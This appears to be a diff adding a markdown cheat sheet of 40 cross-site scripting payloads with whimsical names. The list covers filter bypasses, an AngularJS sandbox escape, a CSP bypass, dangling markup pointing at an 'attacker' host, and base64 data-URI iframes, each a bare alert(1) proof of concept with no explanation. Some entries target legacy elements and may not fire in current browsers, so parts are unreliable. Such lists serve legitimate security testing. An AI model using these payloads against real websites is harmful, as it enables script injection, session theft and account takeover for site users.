@@ -1,0 +1,256 @@
+1. **The Silent Reflection**
+
+   ```html
+   </p><img src=x onerror=alert(1)>
+   ```
+
+2. **The Forbidden Space**
+
+   ```html
+   <img%09src ="x%09onerror" ="alert(1)"></img%09src>
+   ```
+
+3. **The Polyglot Oracle**
+
+   ```html
+   "><svg/onload=alert(1)><!--
+   ```
+
+4. **The Ghost Trail** (AngularJS)
+
+   ```html
+   {{constructor.constructor('alert(1)')()}}
+   ```
+
+5. **The Broken Concat**
+
+   ```js
+   "-alert(1)-";
+   ```
+
+6. **The Dangling Markup**
+
+   ```html
+   "><a href="https://attacker/#<svg/onload=alert(1)>">click</a>
+   ```
+
+7. **The CSP Mirage**
+
+   ```html
+   <svg><script xlink:href=data:text/javascript,alert(1) /></svg>
+   ```
+
+8. **The Prototype Ritual**
+
+   ```js
+   {}.constructor.constructor('alert(1)')()
+   ```
+
+9. **The Entity Whisperer**
+
+   ```html
+   &lt;img src=x onerror=alert(1)&gt;
+   ```
+
+10. **The DOM Invader’s Trial**
+
+    ```js
+    document.write("<img src=x onerror=alert(1)>");
+    ```
+
+11. **The Regex Confutation**
+
+    ```html
+    <svg/onload=alert(1)//>
+    ```
+
+12. **The Attribute Escape**
+
+    ```html
+    "onmouseover="alert(1)
+    ```
+
+13. **The SVG Labyrinth**
+
+    ```html
+    <svg>
+      <animateTransform onbegin="alert(1)" attributeName="x" dur="1s" />
+    </svg>
+    ```
+
+14. **The JSON Echo**
+
+    ```json
+    "\"-alert(1)}//"
+    ```
+
+15. **The Retire.js Hunt** (jQuery < 3)
+
+    ```html
+    <img src=x onerror=$('body').append('
+    <script>
+      alert(1);
+    </script>
+    ')>
+    ```
+
+16. **The Canonical Trap**
+
+    ```html
+    ?'accesskey='x'onclick='alert(1)
+    ```
+
+17. **The Eval Eclipse**
+
+    ```js
+    Function("alert(1)")();
+    ```
+
+18. **The No‑Quote Spell**
+
+    ```js
+    `${alert(1)}`;
+    ```
+
+19. **The One‑Line Curse**
+
+    ```html
+    <svg/onload=alert(1)>
+    ```
+
+20. **The Reflection Maze**
+
+    ```html
+    param1=<svg/onload=alert(1)>&param2="onmouseover="alert(2)
+    ```
+
+21. **Shadow DOM Intrusion**
+
+    ```html
+    <script>
+      let host = document.createElement("div");
+      let shadow = host.attachShadow({ mode: "open" });
+      shadow.innerHTML = "<img src=x onerror=alert(1)>";
+      document.body.appendChild(host);
+    </script>
+    ```
+
+22. **MutationObserver Trigger**
+
+    ```html
+    <script>
+      new MutationObserver(() => alert(1)).observe(document.body, {
+        childList: true,
+      });
+      document.body.innerHTML += "<img src=x onerror=alert(1)>";
+    </script>
+    ```
+
+23. **Event Handler in SVG `<animate>`**
+
+    ```html
+    <svg><animate attributeName="x" from="0" to="1" dur="1s" onbegin="alert(1)"></svg>
+    ```
+
+24. **Base64‑Encoded Script URL**
+
+    ```html
+    <iframe
+      src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+    ></iframe>
+    ```
+
+25. **`<math>` Namespace Injection**
+
+    ```html
+    <math href="javascript:alert(1)">CLICK</math>
+    ```
+
+26. **`<details>` / `<summary>` Hover**
+
+    ```html
+    <details open ontoggle="alert(1)"><summary>test</summary></details>
+    ```
+
+27. **`<object>` Data URI**
+
+    ```html
+    <object data="data:text/html,<script>alert(1)</script>"></object>
+    ```
+
+28. **`<meta http-equiv>` Refresh**
+
+    ```html
+    <meta http-equiv="refresh" content="0;url=javascript:alert(1)" />
+    ```
+
+29. **`<form>` with `formaction`**
+
+    ```html
+    <form><button formaction="javascript:alert(1)">Go</button></form>
+    ```
+
+30. **`<iframe srcdoc>` Injection**
+
+    ```html
+    <iframe srcdoc="<script>alert(1)</script>"></iframe>
+    ```
+
+31. **`<keygen>` Autofocus** _(legacy browsers)_
+
+    ```html
+    <keygen autofocus onfocus="alert(1)"></keygen>
+    ```
+
+32. **`<marquee>` Event**
+
+    ```html
+    <marquee onstart="alert(1)">test</marquee>
+    ```
+
+33. **`<video>` Poster Attribute**
+
+    ```html
+    <video poster="javascript:alert(1)"></video>
+    ```
+
+34. **`<track>` Element**
+
+    ```html
+    <video><track src="javascript:alert(1)" /></video>
+    ```
+
+35. **`<isindex>` Prompt Injection** _(very old HTML)_
+
+    ```html
+    <isindex action="javascript:alert(1)"></isindex>
+    ```
+
+36. **`<input type=image>` with `src`**
+
+    ```html
+    <input type="image" src="x" onerror="alert(1)" />
+    ```
+
+37. **`<link rel=preload>`**
+
+    ```html
+    <link rel="preload" href="javascript:alert(1)" />
+    ```
+
+38. **`<bgsound>`** _(IE‑only)_
+
+    ```html
+    <bgsound src="javascript:alert(1)"></bgsound>
+    ```
+
+39. **`<applet>` Codebase** _(legacy)_
+
+    ```html
+    <applet code="javascript:alert(1)"></applet>
+    ```
+
+40. **`<embed>` with JS URI**
+    ```html
+    <embed src="javascript:alert(1)" />
+    ```
